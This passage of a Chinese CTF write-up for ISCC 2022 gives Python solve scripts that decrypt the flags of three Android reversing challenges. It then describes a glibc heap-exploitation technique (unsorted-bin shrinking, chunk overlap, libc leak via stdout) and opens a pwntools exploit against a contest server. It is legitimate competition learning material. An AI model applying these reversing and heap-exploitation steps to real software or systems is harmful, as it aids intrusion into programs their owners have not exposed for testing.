<span class="line" data-line="9"><span style="color:#F97583">    elif</span><span style="color:#9ECBFF"> 'A'</span><span style="color:#F97583"> &#x3C;=</span><span style="color:#E1E4E8"> c </span><span style="color:#F97583">&#x3C;=</span><span style="color:#9ECBFF"> 'Z'</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">        t </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">( </span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'A'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ((</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(c)</span><span style="color:#F97583">-</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'A'</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8"> )</span><span style="color:#F97583">%</span><span style="color:#79B8FF">26</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="11"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">        t </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> c   </span></span>
<span class="line" data-line="13"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(t) </span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">t</span><span style="color:#F97583">+=</span><span style="color:#9ECBFF">'='</span></span>
<span class="line" data-line="15"></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">string1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "ABCDEfghijklmnopqrsTUVWXYZabcdeFGHIJKLMNOPQRStuvwxyz0123456789-_"</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">string2 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span>
<span class="line" data-line="18"></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">a</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">(base64.b64decode(t.translate(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">.maketrans(string1,string2))))</span></span>
<span class="line" data-line="20"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(base64.b64decode(a))</span></span></code></pre>
<h2 id="mobile">Mobile</h2>
<h3 id="mobilea">MobileA</h3>
<blockquote>
<p>一道简单的Mobile类型的题目，你能成功闯关吗？</p>
</blockquote>
<p>首先用 <code>jadx</code> 打开 <code>apk</code> 文件，定位到 <code>com</code> > <code>example.mobilea</code> > <code>MainActivity</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507193601431.png" alt="image-20220507193601431"></p>
<p>把第 <code>72</code> 行的字符串跑一下</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">a </span><span style="color:#F97583">=</span><span style="color:#F97583"> r</span><span style="color:#9ECBFF">'</span><span style="color:#DBEDFF">=1PmCCY=gQbcBQlnngbhpEEA</span><span style="color:#9ECBFF">'</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">b </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">19</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">21</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">22</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">17</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">23</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="3"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> b:</span></span>
<span class="line" data-line="4"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(a[i], </span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>然后得到的值 <code>base64</code> ，<code>hex</code> 一下，得到一段md5</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507194026880.png" alt="image-20220507194026880"></p>
<p>解密后得到 <code>flag</code> 的后半部分</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507194057508.png" alt="image-20220507194057508"></p>
<p>第一个箭头加密后是 <code>key</code> ， 第二个箭头加密后是 <code>iv</code> ,前两个箭头指的地方，用 <code>base64</code> 加密，记得是<code>“”</code>里面的所有内容，然后第三个地方先 <code>base64</code> 解码一次</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507194306741.png" alt="image-20220507194306741"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Cipher </span><span style="color:#F97583">import</span><span style="color:#79B8FF"> AES</span></span>
<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> base64 </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> b64decode</span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">cipher </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> AES</span><span style="color:#E1E4E8">.new(</span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'S0BlMjAyMiUleQ=='</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">AES</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">MODE_CBC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'SSZWMjAyMioqKg=='</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> b64decode(</span><span style="color:#9ECBFF">'OVV3V3pKSHFjdWlYTG83SWlrdytnb3lsYVpnQXVpb3I3ZVhERnd6NGdRST0='</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="6"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(cipher.decrypt(b64decode(flag)))</span></span></code></pre>
<p>得到的内容和前面 <code>md5</code> 解密的字符拼接一下即为 <code>flag</code> 。</p>
<h3 id="mobileb">MobileB</h3>
<blockquote>
<p>小明在学习过程中突然来了兴致，结合自己学习的知识编写了一个经过加密的app，你能从中找到密匙吗？</p>
</blockquote>
<p>得到字符串，填入下面的exp中，</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220508164409145.png" alt="image-20220508164409145"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> re</span></span>
<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> sys</span></span>
<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> math</span></span>
<span class="line" data-line="4"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> ast </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Str</span></span>
<span class="line" data-line="5"></span>
<span class="line" data-line="6"><span style="color:#F97583">def</span><span style="color:#79B8FF"> sum</span><span style="color:#E1E4E8">(i, i2,i3):</span></span>
<span class="line" data-line="7"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i4 </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">        d </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i2</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">        d2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">        d3 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i4</span></span>
<span class="line" data-line="11"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (d </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2.0</span><span style="color:#E1E4E8">, d3) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> d2):</span></span>
<span class="line" data-line="12"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (d </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2.0</span><span style="color:#E1E4E8">, d3) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> d2):</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">                d4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i4 </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span></span>
<span class="line" data-line="14"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> sum</span><span style="color:#E1E4E8">((</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">)(d2 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2.0</span><span style="color:#E1E4E8">, d4)), i2, i3 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ((</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">)(d4 </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10.0</span><span style="color:#E1E4E8">, i3)))</span></span>
<span class="line" data-line="15"><span style="color:#F97583">            elif</span><span style="color:#E1E4E8"> i4 </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="16"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10.0</span><span style="color:#E1E4E8">, i3) </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 5.0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="17"><span style="color:#F97583">            else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="18"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">)(d3 </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10.0</span><span style="color:#E1E4E8">, i3))</span></span>
<span class="line" data-line="19"><span style="color:#F97583">    return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="20"></span>
<span class="line" data-line="21"><span style="color:#F97583">def</span><span style="color:#B392F0"> strRe</span><span style="color:#E1E4E8">(uStr):</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">    sys.setrecursionlimit(</span><span style="color:#79B8FF">2000000000</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">    strlist </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
<span class="line" data-line="24"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i1 </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">27</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">        a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> sum</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, i1, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">        strlist.append(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(a))</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">    ia </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uStr</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">    strlist1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [x </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> ia.split(</span><span style="color:#9ECBFF">'0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">    strResult </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span></span>
<span class="line" data-line="30"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> strlist1:</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">        strResult </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(strlist.index(i)</span><span style="color:#F97583">+</span><span style="color:#79B8FF">65</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="32"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> strResult</span></span>
<span class="line" data-line="33"></span>
<span class="line" data-line="34"><span style="color:#F97583">def</span><span style="color:#B392F0"> soFlag</span><span style="color:#E1E4E8">(strResult):</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">    sss</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'''1:&#x3C;EWXYZQKLDMNPFGHASTUIJBOCRV&#x3C;2:&#x3C;OPQRBXFMNYZGHISCKTUVWAJDEL&#x3C;3:&#x3C;IJCDEFQKLUVWAXYZGHMOPBNRST&#x3C;4:&#x3C;NOPGZLMAQEFBCHIJKDRSTUVWXY&#x3C;5:&#x3C;FAEJKLMZBCQRSDTUNOPGHIVWXY&#x3C;6:&#x3C;YZPRBQKLGMNWXASTVHEFIJUOCD&#x3C;7:&#x3C;OPQUVRSJDEHWACKTZGMNYIBXFL&#x3C;8:&#x3C;VWNRDEFPQSTAXGHLUMOIJCKYZB&#x3C;9:&#x3C;EHIGZLMAQRJKDXYFBCNOPUVWST&#x3C;10:&#x3C;LMRSAZQEJVWKBCDTUFOPGHIXNY&#x3C;11:&#x3C;NWIUOCLGMVHXASTYZJDBQKPREF&#x3C;12:&#x3C;KTZUVEHIOPNCBWAYXFDRSJGMQL&#x3C;</span></span>
<span class="line" data-line="36"><span style="color:#9ECBFF">    '''</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">    m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> strResult</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">    content</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">re.findall(</span><span style="color:#F97583">r</span><span style="color:#9ECBFF">'</span><span style="color:#DBEDFF">&#x3C;</span><span style="color:#79B8FF">(.</span><span style="color:#F97583">*?</span><span style="color:#79B8FF">)</span><span style="color:#DBEDFF">&#x3C;</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">,sss,re.S)</span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">    iv</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000003</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0000000c</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000006</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000008</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000007</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000002</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000004</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0000000B</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000001</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000005</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00000009</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0000000A</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">    vvv</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[]</span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">    ans</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span></span>
<span class="line" data-line="42"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">        index</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">content[iv[i]</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">].index(m[i])</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">        vvv.append(index)</span></span>
<span class="line" data-line="45"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">24</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">        flag</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span></span>
<span class="line" data-line="47"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">            flag</span><span style="color:#F97583">+=</span><span style="color:#E1E4E8">content[iv[j]</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">][(vvv[j]</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">i)</span><span style="color:#F97583">%</span><span style="color:#79B8FF">26</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="49"><span style="color:#F97583">        if</span><span style="color:#9ECBFF"> 'FLAG'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> flag:</span></span>
<span class="line" data-line="50"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(flag)</span></span>
<span class="line" data-line="51"></span>
<span class="line" data-line="52"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> '__main__'</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">    uStr </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '5340512305240513012402051205053014053405120'</span></span>
<span class="line" data-line="54"><span style="color:#E1E4E8">    a </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> strRe(uStr)</span></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">    b </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> soFlag(a)</span></span></code></pre>
<p>然后使用压缩软件打开<code>apk</code>文件提取 <code>lib\x86_64\libmobileb.so</code> 文件</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220508165010016.png" alt="image-20220508165010016"></p>
<p>使用 <code>ida x64</code> 搜索字符串（<code>shift+f12</code>）找到 <strong>十二个</strong> 地址相连的 <strong>等长字符串</strong> 填入上方·的位置。再把上一步得到的字符串填入。运行脚本找到开头为FLAG的字符串，flag就是ISCC(得到的字符串}</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220508165147452.png" alt="image-20220508165147452"></p>
<h3 id="mobilec">MobileC</h3>
<p>再 <code>so</code> 文件 <code>getkey</code> 函数断点调试，得到 <code>aes_key</code>，然后分析 <code>so</code> 文件里的 <code>GetStr</code> 的加密逻辑，爆破就行</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220524082928171.png" alt="image-20220524082928171"></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220524083215017.png" alt="image-20220524083215017"></p>
<p><code>八位</code> 一组填到脚本里，爆破的结果 <code>长度最短</code> 的字符串即为flag</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Cipher </span><span style="color:#F97583">import</span><span style="color:#79B8FF"> AES</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">enc</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[]</span></span>
<span class="line" data-line="4"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> copy</span></span>
<span class="line" data-line="5"><span style="color:#F97583">def</span><span style="color:#B392F0"> dfs</span><span style="color:#E1E4E8">(s,p):</span></span>
<span class="line" data-line="6"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> p</span><span style="color:#F97583">==</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">        enc.append(s)</span></span>
<span class="line" data-line="8"><span style="color:#F97583">        return</span></span>
<span class="line" data-line="9"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(p,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">        s[i],s[p]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">s[p],s[i]</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">        t</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">copy.deepcopy(s)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">        dfs(t,p</span><span style="color:#F97583">+</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">        s[i],s[p]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">s[p],s[i]</span></span>
<span class="line" data-line="14"><span style="color:#F97583">def</span><span style="color:#B392F0"> fun</span><span style="color:#E1E4E8">(s):</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">    s</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">base64.b64decode(s)</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">    iv </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'i@S&#x26;88CcC.'</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">    iv </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> base64.b64encode(iv.encode())</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">    key </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'QERAPG9dPyZfTC5f'</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">    aes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> AES</span><span style="color:#E1E4E8">.new(key, </span><span style="color:#79B8FF">AES</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">MODE_CBC</span><span style="color:#E1E4E8">, iv)</span></span>
<span class="line" data-line="20"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(aes.decrypt(s))</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">dfs([</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">],</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">s</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'xb6LCvY4 ONK/iar= F4YrvRZ= bWZl2Eu= Fs+fVSe= rtODpbc='</span><span style="color:#E1E4E8">.split(</span><span style="color:#9ECBFF">' '</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="23"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> k </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> enc:</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">    m</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">*</span><span style="color:#79B8FF">48</span></span>
<span class="line" data-line="25"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="26"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">            m[</span><span style="color:#79B8FF">6</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">j</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">k[i]</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">s[i][j]</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">    check</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.join(m)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:]</span></span>
<span class="line" data-line="29"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> check</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'====='</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">        fun(</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.join(m)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">44</span><span style="color:#E1E4E8">])</span></span></code></pre>
<h2 id="pwn">PWN</h2>
<h3 id="heapheap">heapheap</h3>
<p>遇到不能控制 <code>prev_size</code> 的情况，可以通过 <code>shrink unsorted bin</code> 的方法来将 <code>prev_size</code> 填充成 <code>目标size</code> ，原理是 <code>unsortedbin</code> 合并是有顺序的，合并完会在下个 <code>chunk</code> 的 <code>prev_size</code> 位写入之前的大小，从而在 <code>prev_size</code> 留下 <code>size</code> ，造成 <code>chunk overlap</code>。这道题我们还需要爆破 <code>4bit</code> 申请到 <code>stdout</code> 去泄露 <code>libc</code> 。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">"123.57.69.203"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"5320"</span><span style="color:#E1E4E8">)</span></span>
